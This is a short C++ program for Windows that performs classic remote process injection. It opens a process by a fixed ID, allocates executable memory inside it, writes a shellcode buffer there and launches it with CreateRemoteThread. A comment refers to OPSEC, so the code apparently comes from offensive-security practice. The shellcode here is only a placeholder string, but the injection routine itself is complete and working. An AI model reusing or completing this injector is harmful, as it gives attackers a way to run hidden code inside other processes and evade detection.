#include <iostream>
#include <Windows.h>

int main(){
  
  char shellcode[] = "sqmjflsqdmjklm";
  HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,12345); //not very OPSEC 
  LPVOID mem = VirtualAllocEx(proc,NULL,sizeof shellcode,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  BOOL test_write = WriteProcessMemory(proc,mem,shellcode,sizeof shellcode,NULL);
  
  if(test_write){
    
    HANDLE remote_thread=NULL;
    remote_thread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL); //create remote thread and pass our shellcode as thread_start_routine
    CloseHandle(proc);
  }
  
  return 0;
}
